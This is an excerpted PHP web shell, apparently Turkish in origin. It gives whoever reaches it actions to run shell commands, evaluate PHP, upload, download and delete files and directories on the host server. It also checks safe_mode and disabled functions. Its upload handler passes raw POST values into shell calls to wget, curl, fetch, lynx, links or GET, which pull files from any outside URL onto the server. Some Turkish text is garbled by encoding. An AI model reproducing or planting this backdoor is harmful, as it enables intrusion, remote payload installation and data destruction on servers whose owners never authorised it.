...
('1' == @ini_get('safe_mode') ? $safe_mode = 'ON' : $safe_mode = 'OFF(Rootla_Beni:)');

('' != @ini_get('disable_functions') ? $disfunc = ini_get('disable_functions') : $disfunc = 0);
('WIN' === strtoupper(substr(PHP_OS, 0, 3)) ? $os = 1 : $os = 0);
...
$act = ['viewer', 'editor', 'upload', 'shell', 'phpeval', 'download', 'delete', 'deletedir']; //here added new actions
...
if ('delete' == $action) {
    if (unlink($file)) {
        $content .= $lang['deletefileok'] . "<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='" . $dir . "'; document.reqs.submit();\"> AnaSayfaya D�nemk ��in T�klay�n�z.</a>";
    }
}
//delete dir
if ('deletedir' == $action) {
    if (!rmdir($file)) {
        $content .= $lang['empty'] . "<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='" . $dir . "'; document.reqs.submit();\"> AnaSayfaya D�nemk ��in T�klay�n�z.</a>";
    } else {
        $content .= $lang['deletedirok'] . "<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='" . $dir . "'; document.reqs.submit();\"> AnaSayfaya D�nemk ��in T�klay�n�z.</a>";
    }
}
//shell
if ('shell' == $action) {
...
<input type=submit name=upload value=Upload></form></td></tr>';
    ...
    if (isset($_POST['uploadloc'])) {
        ...
        if (1 == test_dir($dirupload) && 3 != test_dir($dir) && 4 != test_dir($dir)) {
            createdir($dirupload);
        }
    ...
    if (isset($_POST['upload'])) {
        if (!empty($_POST['with']) && !empty($_POST['urldown']) && !empty($_POST['filename'])) {
            switch ($_POST['with']) {case wget:shell(which('wget') . ' ' . $_POST['urldown'] . ' -O ' . $_POST['filename'] . ''); break; case fetch:shell(which('fetch') . ' -o ' . $_POST['filename'] . ' -p ' . $_POST['urldown'] . ''); break; case lynx:shell(which('lynx') . ' -source ' . $_POST['urldown'] . ' > ' . $_POST['filename'] . ''); break; case links:shell(which('links') . ' -source ' . $_POST['urldown'] . ' > ' . $_POST['filename'] . ''); break; case GET:shell(which('GET') . ' ' . $_POST['urldown'] . ' > ' . $_POST['filename'] . ''); break; case curl:shell(which('curl') . ' ' . $_POST['urldown'] . ' -o ' . $_POST['filename'] . ''); break; }
        }
    }
}?> 
